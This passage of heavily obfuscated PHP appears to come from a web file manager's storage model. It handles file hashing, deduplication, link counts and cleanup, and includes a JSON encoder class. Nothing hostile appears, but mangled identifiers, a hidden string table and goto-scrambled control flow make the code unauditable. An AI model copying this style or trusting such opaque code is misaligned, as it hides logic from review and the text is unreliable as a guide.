IO::hashSimple($F„ä·ÀÂÌ), $A‰†É†ØÑ[2128] => $B’ÙŒŠËß ? $B’ÙŒŠËß : $bÚ¼ğÔ„í); goto fÛĞŒù‹àÒ; D¯ñŞ¹—öö: $A‰†É†ØÑ =& $_SERVER[»„]; if (!IO::exist($F„ä·ÀÂÌ)) { return !1; } $bÚ¼ğÔ„í = $fĞ“ÖëòÍÔ[$A‰†É†ØÑ[159]] ? $fĞ“ÖëòÍÔ[$A‰†É†ØÑ[159]] : $A‰†É†ØÑ[33]; goto Fâ±ŠÜìÃ; aÁãÃÖª¼Ô: } private function addFileData($D³×œË¬ ¤) { $b‡­õÍ«¶ =& $_SERVER[»„]; if (!$D³×œË¬ ¤) { return !1; } $D³×œË¬ ¤[$b‡­õÍ«¶[77]] = intval($D³×œË¬ ¤[$b‡­õÍ«¶[77]]); if (!$D³×œË¬ ¤[$b‡­õÍ«¶[77]] && strlen($D³×œË¬ ¤[$b‡­õÍ«¶[160]]) > 32) { $D³×œË¬ ¤[$b‡­õÍ«¶[77]] = intval(substr($D³×œË¬ ¤[$b‡­õÍ«¶[160]], 32)); } $fÊÌÈàÚ¯õ = $this->add($D³×œË¬ ¤); return $this->find($fÊÌÈàÚ¯õ); } public function addFile($Bò¢Ğ§Â, $eÙàºéˆ , $Dõ¡øàöãÂ = false) { $aàÆ–Ê‡ = IO::hashSimple($Bò¢Ğ§Â); $e²¨˜Ö½­ô = IO::hashMd5($Bò¢Ğ§Â); $fÔÌØ¢îéÕ = IO::size($Bò¢Ğ§Â); if ($D¶ã‡İ„‚Ó = $this->addFileCheckExist($aàÆ–Ê‡, $e²¨˜Ö½­ô, $fÔÌØ¢îéÕ)) { return $D¶ã‡İ„‚Ó; } $FĞ­Ê¸ßÁÁ = $this->addFileMake($Bò¢Ğ§Â, $fÔÌØ¢îéÕ, $aàÆ–Ê‡, $e²¨˜Ö½­ô, $eÙàºéˆ , $Dõ¡øàöãÂ); return $this->addFileData($FĞ­Ê¸ßÁÁ); } public function addFileMake($B¢´«Ç»Œ¿, $dŠ‘Ì‹Ğã, $EŠ ©­øºÁ, $eª¬ãÚñô·, $A¨ŞÉ´É«Ê, $F¨¨ñ‚„») { goto F²î„ö¼Ìì; F²î„ö¼Ìì: $EÇ¯î¢¤ÇĞ =& $_SERVER[»„]; $cáØäèÛº… = $this->createFileName($A¨ŞÉ´É«Ê); $b¸É—Îá†Û = get_path_father($cáØäèÛº…); goto B’¸’¼³¡å; CŒìÕù¢â¹: $F‰¶ãÌŸé = KodIO::defaultDriver(); $C¶øèÀµ¢ = array($EÇ¯î¢¤ÇĞ[516] => $dŠ‘Ì‹Ğã, $EÇ¯î¢¤ÇĞ[2126] => 1, $EÇ¯î¢¤ÇĞ[382] => $A¨ŞÉ´É«Ê, $EÇ¯î¢¤ÇĞ[723] => $F‰¶ãÌŸé[$EÇ¯î¢¤ÇĞ[363]], $EÇ¯î¢¤ÇĞ[383] => $cáØäèÛº…, $EÇ¯î¢¤ÇĞ[2127] => $EŠ ©­øºÁ, $EÇ¯î¢¤ÇĞ[2128] => $eª¬ãÚñô·); return $C¶øèÀµ¢; goto fâ®¢¿Â´; B’¸’¼³¡å: $aĞÀ¢îòï° = get_path_this($cáØäèÛº…); if ($F¨¨ñ‚„») { $b© ¹‚öò = IO::move($B¢´«Ç»Œ¿, $b¸É—Îá†Û, !1, $aĞÀ¢îòï°); } else { $b© ¹‚öò = IO::copy($B¢´«Ç»Œ¿, $b¸É—Îá†Û, !1, $aĞÀ¢îòï°); } if (!$b© ¹‚öò) { return !1; } goto CŒìÕù¢â¹; fâ®¢¿Â´: } public function addFileCheckExist($B„••Ú»™ğ, $fº¥’²Å«, $E¬Š›“®Ë“) { $cÓã†×šåÀ =& $_SERVER[»„]; $F£˜ÊØ¯øé = $this->findByHash($B„••Ú»™ğ, $fº¥’²Å«); if (!$F£˜ÊØ¯øé) { return !1; } $Dßğ²âíĞ = array($cÓã†×šåÀ[2126] => intval($F£˜ÊØ¯øé[$cÓã†×šåÀ[2129]]) + 1, $cÓã†×šåÀ[516] => $E¬Š›“®Ë“); $this->where(array($cÓã†×šåÀ[416] => $F£˜ÊØ¯øé[$cÓã†×šåÀ[415]]))->save($Dßğ²âíĞ); return $F£˜ÊØ¯øé; } public function remove($fÈ™ƒ×å¤Š) { $this->linkCountChange($fÈ™ƒ×å¤Š, !1); $this->clearEmpty(); return !0; } public function linkAdd($DàÇæ»™©) { $this->linkCountChange($DàÇæ»™©, !0); } public function linkCountChange($BùğİÉÖÑç, $DÛ·â˜·áÂ) { goto aøİƒé§äØ; aøİƒé§äØ: $aó†©°Û¶¹ =& $_SERVER[»„]; if (!$BùğİÉÖÑç) { return; } if (!is_array($BùğİÉÖÑç)) { $BùğİÉÖÑç = array($BùğİÉÖÑç); } goto bÔœÙèº; eãĞíáê¶ó: foreach ($B…ãŒ£ø±À as $FÀâÕ’šÒŞ => $B–Ã²««óç) { $fªÙ†è½ó™ = $B–Ã²««óç . $aó†©°Û¶¹[33]; if (!$Dİ¾­Ñòñ[$fªÙ†è½ó™]) { $Dİ¾­Ñòñ[$fªÙ†è½ó™] = array(); } $Dİ¾­Ñòñ[$fªÙ†è½ó™][] = $FÀâÕ’šÒŞ; } foreach ($Dİ¾­Ñòñ as $B–Ã²««óç => $e†ƒô¨) { if (!$e†ƒô¨) { continue; } $B–Ã²««óç = $DÛ·â˜·áÂ ? $B–Ã²««óç : -intval($B–Ã²««óç); $eœÈ®ƒÙÊ‹ = array($aó†©°Û¶¹[415] => array($aó†©°Û¶¹[7], $e†ƒô¨)); if ($B–Ã²««óç < 0) { $eœÈ®ƒÙÊ‹[$aó†©°Û¶¹[2129]] = array($aó†©°Û¶¹[919], abs($B–Ã²««óç)); } $this->where($eœÈ®ƒÙÊ‹)->setAdd($aó†©°Û¶¹[2129], $B–Ã²««óç); } goto A‰ÂËÆí‰’; bÔœÙèº: $B…ãŒ£ø±À = array(); foreach ($BùğİÉÖÑç as $FÀâÕ’šÒŞ) { $fªÙ†è½ó™ = $FÀâÕ’šÒŞ . $aó†©°Û¶¹[33]; if (!$B…ãŒ£ø±À[$fªÙ†è½ó™]) { $B…ãŒ£ø±À[$fªÙ†è½ó™] = 0; } $B…ãŒ£ø±À[$fªÙ†è½ó™]++; } $Dİ¾­Ñòñ = array(); goto eãĞíáê¶ó; A‰ÂËÆí‰’: } public function findByHash($Dù’Â½˜†ñ, $c˜’šçèó = false) { $BÃ¸»’åœ” =& $_SERVER[»„]; if (!$Dù’Â½˜†ñ && !$c˜’šçèó) { return !1; } $c–Ôø£¡“— = array($BÃ¸»’åœ”[2127] => $Dù’Â½˜†ñ); if ($c˜’šçèó) { $c–Ôø£¡“— = array($BÃ¸»’åœ”[2128] => $c˜’šçèó); } return $this->order($BÃ¸»’åœ”[2130])->where($c–Ôø£¡“—)->find(); } public function clearEmpty($eÏ­·ƒ´ªÂ = 0) { goto B‚ŠÅ”“»; B‚ŠÅ”“»: $B¦„óŞŠª =& $_SERVER[»„]; $fçº¡¢ñ‹ = time() - 3600 * 24 * $eÏ­·ƒ´ªÂ; $Dª•ªŒ‘İ = $B¦„óŞŠª[2131] . $fçº¡¢ñ‹; goto FâÏˆàÂßª; FâÏˆàÂßª: $a‘ï³ïŒ·Ô = $this->where($Dª•ªŒ‘İ)->select(); if (!$a‘ï³ïŒ·Ô) { return; } $dæ»‰ßäØ¢ = new Task($B¦„óŞŠª[2132], $B¦„óŞŠª[33], count($a‘ï³ïŒ·Ô)); goto E—¯Å²Òè; E—¯Å²Òè: foreach ($a‘ï³ïŒ·Ô as $FØ¿èâƒô) { $dæ»‰ßäØ¢->update(1); $this->resetFile($FØ¿èâƒô); } $dæ»‰ßäØ¢->end(); goto C¸¸Î„¥´; C¸¸Î„¥´: } private function resetFile($AçÎéôØ) { goto dàªÌŒË†¨; eï¤†«ôò«: $BÉ¾ã‹¿…– = Model($DëéîÓÕáÊ[2133])->where($A“—À³Ì²)->count(); $C£ö¦´•• = intval($aßŠÚ·ŠàÃ) + intval($BÉ¾ã‹¿…–); if ($C£ö¦´•• == 0) { IO::remove($AçÎéôØ[$DëéîÓÕáÊ[75]]); $this->where($A“—À³Ì²)->delete(); $this->metaSet($AçÎéôØ[$DëéîÓÕáÊ[415]], null, null); return; } goto cÎÆÃ»†²‡; dàªÌŒË†¨: $DëéîÓÕáÊ =& $_SERVER[»„]; $A“—À³Ì² = array($DëéîÓÕáÊ[416] => $AçÎéôØ[$DëéîÓÕáÊ[415]]); $aßŠÚ·ŠàÃ = Model($DëéîÓÕáÊ[1098])->where($A“—À³Ì²)->count(); goto eï¤†«ôò«; cÎÆÃ»†²‡: if ($AçÎéôØ[$DëéîÓÕáÊ[2129]] != $C£ö¦´••) { $this->where($A“—À³Ì²)->save(array($DëéîÓÕáÊ[2126] => $C£ö¦´••)); } goto bÆø¤ƒÃ¡ä; bÆø¤ƒÃ¡ä: } public function storageInfo($d÷·íŸŠğ = false) { goto D‹ÈÊ±‘‘; D¸Ò×ï™ßó: $DÃ¸ğ²ïÕ­ = 1; $f‡…éºğ†‰ = 0; $BÙô¦’°ù° = 5000; goto b×»ˆ´Õ–¾; D‹ÈÊ±‘‘: $F÷§ì²ÙéŠ =& $_SERVER[»„]; $C¤ïê“‹ù‰ = $this->count() + 0.0; $f†ƒ©Îæ›µ = 0; goto D¸Ò×ï™ßó; b×»ˆ´Õ–¾: for ($FîøÒ…æ°‹ = 0; $FîøÒ…æ°‹ < $C¤ïê“‹ù‰; $FîøÒ…æ°‹ = $FîøÒ…æ°‹ + $BÙô¦’°ù°) { $dèƒ³Îí±¹ = $this->limit($FîøÒ…æ°‹, $FîøÒ…æ°‹ + $BÙô¦’°ù°)->select(); foreach ($dèƒ³Îí±¹ as $eÃä¶ßø˜Ï) { $DÃ¸ğ²ïÕ­ += $eÃä¶ßø˜Ï[$F÷§ì²ÙéŠ[77]] * $eÃä¶ßø˜Ï[$F÷§ì²ÙéŠ[2129]]; $f†ƒ©Îæ›µ += $eÃä¶ßø˜Ï[$F÷§ì²ÙéŠ[77]] * ($eÃä¶ßø˜Ï[$F÷§ì²ÙéŠ[2129]] - 1); $f‡…éºğ†‰ += $eÃä¶ßø˜Ï[$F÷§ì²ÙéŠ[2129]]; } } $A‡òÓâŸ•Ë = array($F÷§ì²ÙéŠ[2134] => $DÃ¸ğ²ïÕ­, $F÷§ì²ÙéŠ[2135] => $f†ƒ©Îæ›µ, $F÷§ì²ÙéŠ[2136] => $f†ƒ©Îæ›µ / $DÃ¸ğ²ïÕ­, $F÷§ì²ÙéŠ[81] => $C¤ïê“‹ù‰, $F÷§ì²ÙéŠ[2137] => $f‡…éºğ†‰); return $A‡òÓâŸ•Ë; goto c®÷êõ¶Û÷; c®÷êõ¶Û÷: } } goto B¯ÀØ¡×Ñù; cÏê‚ÒÅóÏ: define($_SERVER[»„][1905], 16); define($_SERVER[»„][1906], 32); class Services_JSON { function __construct($aö‡Õ‹øñ = 0) { $this->use = $aö‡Õ‹øñ; } function utf162utf8($eƒÅ¢£Ì) { $f‡Ê ‡ÒˆĞ =& $_SERVER[»„]; if (function_exists($f‡Ê ‡ÒˆĞ[68])) { return mb_convert_encoding($eƒÅ¢£Ì, $f‡Ê ‡ÒˆĞ[1558], $f‡Ê ‡ÒˆĞ[1907]); } $FÛî—¯Ê¶è = ord($eƒÅ¢£Ì[0]) << 8 | ord($eƒÅ¢£Ì[1]); switch (!0) { case (127 & $FÛî—¯Ê¶è) == $FÛî—¯Ê¶è: return chr(127 & $FÛî—¯Ê¶è); case (2047 & $FÛî—¯Ê¶è) == $FÛî—¯Ê¶è: return chr(192 | $FÛî—¯Ê¶è >> 6 & 31) . chr(128 | $FÛî—¯Ê¶è & 63); case (65535 & $FÛî—¯Ê¶è) == $FÛî—¯Ê¶è: return chr(224 | $FÛî—¯Ê¶è >> 12 & 15) . chr(128 | $FÛî—¯Ê¶è >> 6 & 63) . chr(128 | $FÛî—¯Ê¶è & 63); } return $f‡Ê ‡ÒˆĞ[33]; } function utf82utf16($B¢Á‚Š‡¥ë) { $cÚÚİ¨Úé =& $_SERVER[»„]; if (function_exists($cÚÚİ¨Úé[68])) { return mb_convert_encoding($B¢Á‚Š‡¥ë, $cÚÚİ¨Úé[1907], $cÚÚİ¨Úé[1558]); } switch (strlen($B¢Á‚Š‡¥ë)) { case 1: return $B¢Á‚Š‡¥ë; case 2: return chr(7 & ord($B¢Á‚Š‡¥ë[0]) >> 2) . chr(192 & ord($B¢Á‚Š‡¥ë[0]) << 6 | 63 & ord($B¢Á‚Š‡¥ë[1])); case 3: return chr(240 & ord($B¢Á‚Š‡¥ë[0]) << 4 | 15 & ord($B¢Á‚Š‡¥ë[1]) >> 2) . chr(192 & ord($B¢Á‚Š‡¥ë[1]) << 6 | 127 & ord($B¢Á‚Š‡¥ë[2])); } return $cÚÚİ¨Úé[33]; } function encode($eÑ¯‡ÖŸÇ–) { $bÑ­ãù†Š =& $_SERVER[»„]; switch (gettype($eÑ¯‡ÖŸÇ–)) { case $bÑ­ãù†Š[1569]: return $eÑ¯‡ÖŸÇ– ? $bÑ­ãù†Š[1568] : $bÑ­ãù†Š[1570]; case $bÑ­ãù†Š[1908]: return $bÑ­ãù†Š[99]; case $bÑ­ãù†Š[299]: return (int) $eÑ¯‡ÖŸÇ–; case $bÑ­ãù†Š[274]: case $bÑ­ãù†Š[273]: return (double) $eÑ¯‡ÖŸÇ–; case $bÑ­ãù†Š[308]: $FåŠá‘Šã = $bÑ­ãù†Š[33]; $F²ÖÁºÚæÔ = strlen($eÑ¯‡ÖŸÇ–); for ($a²ùÓ‚ÎÚ‰ = 0; $a²ùÓ‚ÎÚ‰ < $F²ÖÁºÚæÔ; ++$a²ùÓ‚ÎÚ‰) { $B´®¤’ƒ‡ì = ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰]); switch (!0) { case $B´®¤’ƒ‡ì == 8: $FåŠá‘Šã .= $bÑ­ãù†Š[1909]; break; case $B´®¤’ƒ‡ì == 9: $FåŠá‘Šã .= $bÑ­ãù†Š[1545]; break; case $B´®¤’ƒ‡ì == 10: $FåŠá‘Šã .= $bÑ­ãù†Š[1543]; break; case $B´®¤’ƒ‡ì == 12: $FåŠá‘Šã .= $bÑ­ãù†Š[1910]; break; case $B´®¤’ƒ‡ì == 13: $FåŠá‘Šã .= $bÑ­ãù†Š[1544]; break; case $B´®¤’ƒ‡ì == 34: case $B´®¤’ƒ‡ì == 47: case $B´®¤’ƒ‡ì == 92: $FåŠá‘Šã .= $bÑ­ãù†Š[93] . $eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰]; break; case $B´®¤’ƒ‡ì >= 32 && $B´®¤’ƒ‡ì <= 127: $FåŠá‘Šã .= $eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰]; break; case ($B´®¤’ƒ‡ì & 224) == 192: $dÊğ‰ÉÓ¤ç = pack($bÑ­ãù†Š[1911], $B´®¤’ƒ‡ì, ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 1])); $a²ùÓ‚ÎÚ‰ += 1; $a¯«¡Ñóƒ¶ = $this->utf82utf16($dÊğ‰ÉÓ¤ç); $FåŠá‘Šã .= sprintf($bÑ­ãù†Š[1912], bin2hex($a¯«¡Ñóƒ¶)); break; case ($B´®¤’ƒ‡ì & 240) == 224: $dÊğ‰ÉÓ¤ç = pack($bÑ­ãù†Š[1911], $B´®¤’ƒ‡ì, ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 1]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 2])); $a²ùÓ‚ÎÚ‰ += 2; $a¯«¡Ñóƒ¶ = $this->utf82utf16($dÊğ‰ÉÓ¤ç); $FåŠá‘Šã .= sprintf($bÑ­ãù†Š[1912], bin2hex($a¯«¡Ñóƒ¶)); break; case ($B´®¤’ƒ‡ì & 248) == 240: $dÊğ‰ÉÓ¤ç = pack($bÑ­ãù†Š[1911], $B´®¤’ƒ‡ì, ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 1]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 2]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 3])); $a²ùÓ‚ÎÚ‰ += 3; $a¯«¡Ñóƒ¶ = $this->utf82utf16($dÊğ‰ÉÓ¤ç); $FåŠá‘Šã .= sprintf($bÑ­ãù†Š[1912], bin2hex($a¯«¡Ñóƒ¶)); break; case ($B´®¤’ƒ‡ì & 252) == 248: $dÊğ‰ÉÓ¤ç = pack($bÑ­ãù†Š[1911], $B´®¤’ƒ‡ì, ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 1]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 2]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 3]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 4])); $a²ùÓ‚ÎÚ‰ += 4; $a¯«¡Ñóƒ¶ = $this->utf82utf16($dÊğ‰ÉÓ¤ç); $FåŠá‘Šã .= sprintf($bÑ­ãù†Š[1912], bin2hex($a¯«¡Ñóƒ¶)); break; case ($B´®¤’ƒ‡ì & 254) == 252: $dÊğ‰ÉÓ¤ç = pack($bÑ­ãù†Š[1911], $B´®¤’ƒ‡ì, ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 1]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 2]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 3]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 4]), ord($eÑ¯‡ÖŸÇ–[$a²ùÓ‚ÎÚ‰ + 5])); $a²ùÓ‚ÎÚ‰ += 5; $a¯«¡Ñóƒ¶ = $this->utf82utf16($dÊğ‰ÉÓ¤ç); $FåŠá‘Šã .= sprintf($bÑ­ãù†Š[1912], bin2hex($a¯«¡Ñóƒ¶)); break; } } return $bÑ­ãù†Š[112] . $FåŠá‘Šã . $bÑ­ãù†Š[112]; case $bÑ­ãù†Š[1913]: if (is_array($eÑ¯‡ÖŸÇ–) && count($eÑ¯‡ÖŸÇ–) && array_keys($eÑ¯‡ÖŸÇ–) !== range(0, sizeof($eÑ¯‡ÖŸÇ–) - 1)) { $aŠ„®Á–ì« = array_map(array($this, $bÑ­ãù†Š[1914]), array_keys($eÑ¯‡ÖŸÇ–), array_values($eÑ¯‡ÖŸÇ–)); foreach ($aŠ„®Á–ì« as $C‰¯¬¼…À†) { if (Services_JSON::isError($C‰¯¬¼…À†)) { return $C‰¯¬¼…À†; } } return $bÑ­ãù†Š[1056] . join($bÑ­ãù†Š[47], $aŠ„®Á–ì«) . $bÑ­ãù†Š[311]; } $Dº‚öÖ¨–á = array_map(array($this, $bÑ­ãù†Š[1915]), $eÑ¯‡ÖŸÇ–); foreach ($Dº‚öÖ¨–á as $a°Ã’Ö§Ûœ) { if (Services_JSON::isError($a°Ã’Ö§Ûœ)) { return $a°Ã’Ö§Ûœ; } } return $bÑ­ãù†Š[153] . join($bÑ­ãù†Š[47], $Dº‚öÖ¨–á) . $bÑ­ãù†Š[472]; case $bÑ­ãù†Š[1916]: $dÀ³‰˜áº¡ = get_object_vars($eÑ¯‡ÖŸÇ–); $aŠ„®Á–ì« = array_map(array($this, $bÑ­ãù†Š[1914]), array_keys($dÀ³‰˜áº¡), array_values($dÀ³‰˜áº¡)); foreach ($aŠ„®Á–ì« as $C‰¯¬¼…À†) { if (Services_JSON::isError($C‰¯¬¼…À†)) { return $C‰¯¬¼…À†; } } return $bÑ­ãù†Š[1056] . join($bÑ­ãù†Š[47], $aŠ„®Á–ì«) . $bÑ­ãù†Š[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $bÑ­ãù†Š[99] : new Services_JSON_Error(gettype($eÑ¯‡ÖŸÇ–) . $bÑ­ãù†Š[1917]); } } function name_value($f¼Ñ‰Äçğ—, $aİê˜¹Î) { $c¾„¨†ô‡ = $this->encode($aİê˜¹Î); if (Services_JSON::isError($c¾„¨†ô‡)) { return $c¾„¨†ô‡; } return $this->encode(strval($f¼Ñ‰Äçğ—)) . $_SERVER[»„][4] . $c¾„¨†ô‡; } function reduce_string($C‘Ú®ÙÔ“İ) { $a„Œ±¿º½é =& $_SERVER[»„]; $C‘Ú®ÙÔ“İ = preg_replace(array($a„Œ±¿º½é[1918], $a„Œ±¿º½é[1919], $a„Œ±¿º½é[1920]), $a„Œ±¿º½é[33], $C‘Ú®ÙÔ“İ); return trim($C‘Ú®ÙÔ“İ); } function decode($CÎõˆ…Ÿ‹Ò) { $f„—á‘Ã¿ =& $_SERVER[»„]; $CÎõˆ…Ÿ‹Ò = $this->reduce_string($CÎõˆ…Ÿ‹Ò); switch (strtolower($CÎõˆ…Ÿ‹Ò)) { case $f„—á‘Ã¿[1568]: return !0; case $f„—á‘Ã¿[1570]: return !1; case $f„—á‘Ã¿[99]: return null; default: $F½î¿Ò±‹ = array(); if (is_numeric($CÎõˆ…Ÿ‹Ò)) { return (double) $CÎõˆ…Ÿ‹Ò == (int) $CÎõˆ…Ÿ‹Ò ? (int) $CÎõˆ…Ÿ‹Ò : (double) $CÎõˆ…Ÿ‹Ò; } elseif (preg_match($f„—á‘Ã¿[1921], $CÎõˆ…Ÿ‹Ò, $F½î¿Ò±‹) && $F½î¿Ò±‹[1] == $F½î¿Ò±‹[2]) { $Fß£óãò·ˆ = substr($CÎõˆ…Ÿ‹Ò, 0, 1); $c¹¹…”‰­ˆ = substr($CÎõˆ…Ÿ‹Ò, 1, -1); $Cğ¼ôĞ“ø— = $f„—á‘Ã¿[33]; $dàÊèÖõ„ = strlen($c¹¹…”‰­ˆ); for ($C„§¦×”¯‰ = 0; $C„§¦×”¯‰ < $dàÊèÖõ„; ++$C„§¦×”¯‰) { $FÒÒà†ÒöÍ = substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 2); $AĞ¹—ôÛ‡“ = ord($c¹¹…”‰­ˆ[$C„§¦×”¯‰]); switch (!0) { case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1909]: $Cğ¼ôĞ“ø— .= chr(8); ++$C„§¦×”¯‰; break; case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1545]: $Cğ¼ôĞ“ø— .= chr(9); ++$C„§¦×”¯‰; break; case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1543]: $Cğ¼ôĞ“ø— .= chr(10); ++$C„§¦×”¯‰; break; case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1910]: $Cğ¼ôĞ“ø— .= chr(12); ++$C„§¦×”¯‰; break; case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1544]: $Cğ¼ôĞ“ø— .= chr(13); ++$C„§¦×”¯‰; break; case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1328]: case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1922]: case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1538]: case $FÒÒà†ÒöÍ == $f„—á‘Ã¿[1540]: if ($Fß£óãò·ˆ == $f„—á‘Ã¿[112] && $FÒÒà†ÒöÍ != $f„—á‘Ã¿[1922] || $Fß£óãò·ˆ == $f„—á‘Ã¿[55] && $FÒÒà†ÒöÍ != $f„—á‘Ã¿[1328]) { $Cğ¼ôĞ“ø— .= $c¹¹…”‰­ˆ[++$C„§¦×”¯‰]; } break; case preg_match($f„—á‘Ã¿[1923], substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 6)): $EÉáÄé÷– = chr(hexdec(substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰ + 2, 2))) . chr(hexdec(substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰ + 4, 2))); $Cğ¼ôĞ“ø— .= $this->utf162utf8($EÉáÄé÷–); $C„§¦×”¯‰ += 5; break; case $AĞ¹—ôÛ‡“ >= 32 && $AĞ¹—ôÛ‡“ <= 127: $Cğ¼ôĞ“ø— .= $c¹¹…”‰­ˆ[$C„§¦×”¯‰]; break; case ($AĞ¹—ôÛ‡“ & 224) == 192: $Cğ¼ôĞ“ø— .= substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 2); ++$C„§¦×”¯‰; break; case ($AĞ¹—ôÛ‡“ & 240) == 224: $Cğ¼ôĞ“ø— .= substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 3); $C„§¦×”¯‰ += 2; break; case ($AĞ¹—ôÛ‡“ & 248) == 240: $Cğ¼ôĞ“ø— .= substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 4); $C„§¦×”¯‰ += 3; break; case ($AĞ¹—ôÛ‡“ & 252) == 248: $Cğ¼ôĞ“ø— .= substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 5); $C„§¦×”¯‰ += 4; break; case ($AĞ¹—ôÛ‡“ & 254) == 252: $Cğ¼ôĞ“ø— .= substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 6); $C„§¦×”¯‰ += 5; break; } } return $Cğ¼ôĞ“ø—; } elseif (preg_match($f„—á‘Ã¿[1924], $CÎõˆ…Ÿ‹Ò) || preg_match($f„—á‘Ã¿[1925], $CÎõˆ…Ÿ‹Ò)) { goto cèŠèøÜš¬; cèŠèøÜš¬: if ($CÎõˆ…Ÿ‹Ò[0] == $f„—á‘Ã¿[153]) { $Fƒ¾êä‘³ = array(SERVICES_JSON_IN_ARR); $cÇ²¸ ‡˜ğ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Fƒ¾êä‘³ = array(SERVICES_JSON_IN_OBJ); $f¹Ó´à–‹¼ = array(); } else { $Fƒ¾êä‘³ = array(SERVICES_JSON_IN_OBJ); $f¹Ó´à–‹¼ = new stdClass(); } } array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_SLICE, $f„—á‘Ã¿[259] => 0, $f„—á‘Ã¿[1927] => !1)); $c¹¹…”‰­ˆ = substr($CÎõˆ…Ÿ‹Ò, 1, -1); goto a§ÈêÍ‘·; A›îˆ„é°: for ($C„§¦×”¯‰ = 0; $C„§¦×”¯‰ <= $dàÊèÖõ„; ++$C„§¦×”¯‰) { $A¿„¸Òºµ¼ = end($Fƒ¾êä‘³); $FÒÒà†ÒöÍ = substr($c¹¹…”‰­ˆ, $C„§¦×”¯‰, 2); if ($C„§¦×”¯‰ == $dàÊèÖõ„ || $c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[47] && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] == SERVICES_JSON_SLICE) { $a¾İ½¼Á›ô = substr($c¹¹…”‰­ˆ, $A¿„¸Òºµ¼[$f„—á‘Ã¿[259]], $C„§¦×”¯‰ - $A¿„¸Òºµ¼[$f„—á‘Ã¿[259]]); array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_SLICE, $f„—á‘Ã¿[259] => $C„§¦×”¯‰ + 1, $f„—á‘Ã¿[1927] => !1)); if (reset($Fƒ¾êä‘³) == SERVICES_JSON_IN_ARR) { array_push($cÇ²¸ ‡˜ğ, $this->decode($a¾İ½¼Á›ô)); } elseif (reset($Fƒ¾êä‘³) == SERVICES_JSON_IN_OBJ) { $E¹ÅãÅÍîŠ = array(); if (preg_match($f„—á‘Ã¿[1928], $a¾İ½¼Á›ô, $E¹ÅãÅÍîŠ)) { $B‹ ‘¤¾Õ = $this->decode($E¹ÅãÅÍîŠ[1]); $e±³®âÉ = $this->decode($E¹ÅãÅÍîŠ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f¹Ó´à–‹¼[$B‹ ‘¤¾Õ] = $e±³®âÉ; } else { $f¹Ó´à–‹¼->{$B‹ ‘¤¾Õ} = $e±³®âÉ; } } elseif (preg_match($f„—á‘Ã¿[1929], $a¾İ½¼Á›ô, $E¹ÅãÅÍîŠ)) { $B‹ ‘¤¾Õ = $E¹ÅãÅÍîŠ[1]; $e±³®âÉ = $this->decode($E¹ÅãÅÍîŠ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f¹Ó´à–‹¼[$B‹ ‘¤¾Õ] = $e±³®âÉ; } else { $f¹Ó´à–‹¼->{$B‹ ‘¤¾Õ} = $e±³®âÉ; } } } } elseif (($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[112] || $c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $f„—á‘Ã¿[55]) && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] != SERVICES_JSON_IN_STR) { array_push($Fƒ¾êä‘³, array($f„—á‘Ã¿[1926] => SERVICES_JSON_IN_STR, $f„—á‘Ã¿[259] => $C„§¦×”¯‰, $f„—á‘Ã¿[1927] => $c¹¹…”‰­ˆ[$C„§¦×”¯‰])); } elseif ($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == $A¿„¸Òºµ¼[$f„—á‘Ã¿[1927]] && $A¿„¸Òºµ¼[$f„—á‘Ã¿[1926]] == SERVICES_JSON_IN_STR && (strlen(substr($c¹¹…”‰­ˆ, 0, $C„§¦×”¯‰)) - strlen(rtrim(substr($c¹¹…”‰­ˆ, 0, $C„§¦×”¯‰), $f„—á‘Ã¿[93]))) % 2 != 1) { array_pop($Fƒ¾êä‘³); } elseif ($c¹¹…”‰­ˆ[$C„§¦×”¯‰] == 